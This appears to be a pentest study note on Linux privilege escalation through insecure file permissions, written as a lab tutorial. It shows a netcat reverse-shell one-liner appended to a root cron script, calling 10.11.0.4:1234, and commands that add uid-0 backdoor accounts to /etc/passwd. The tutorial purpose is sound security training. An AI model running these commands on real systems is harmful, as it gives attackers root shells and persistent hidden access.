---
description: >-
  Insecure File Permissions (Linux)
title: Insecure File Permissions (Linux)           # Add title here
date: 2022-11-09 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Linux - Insecure File Permissions]                     # Change Templates to Writeup
tags: [insecure file permissions, linux privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Writable and executable file
In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level. Useful commands are:
```bash
find / -perm -0002 -type d 2>/dev/null
find / -perm -0020 -type d 2>/dev/null
```

On a Linux system, the cron time-based job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

For the purpose of this example, we will SSH to our dedicated Debian client. In a previous section, we showed where to look on the filesystem for installed cron jobs on a target system. We could also inspect the cron log file (/var/log/cron.log) for running cron jobs:

```bash
student@debian:~$ grep "CRON" /var/log/cron.log
Jan27 15:55:26 victim cron[719]: (CRON) INFO (pidfile fd = 3)
Jan27 15:55:26 victim cron[719]: (CRON) INFO (Running @reboot jobs)
...
Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
```

No that we know the location of the script, we can inspect its contents and permissions.
```bash
student@debian:~$ cat /var/scripts/user_backups.sh
#!/bin/bash

cp -rf /home/student/ /var/backups/student/

student@debian:~$ ls -lah /var/scripts/user_backups.sh 
-rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh
```

Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-line. If our plan works, we should receive a root-level reverse shell on our attacking machine after, at most, a five minute period.

```bash
student@debian:/var/scripts$ echo >> user_backups.sh 

student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh

student@debian:/var/scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/student/ /var/backups/student/


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

### /etc/passwd

If the /etc/passwd file has writable permission we can add a line to /etc/passwd using the appropriate format:

```bash
student@debian:~$ openssl passwd evil
AK24fcSx2Il3I

student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

student@debian:~$ su root2
Password: evil

root@debian:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
```

Secondary Option:
```bash
openssl passwd -1 -salt doom doom
    
echo 'doom:$1$doom$m/meYVrO7ZsSmCo1/p4v..:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```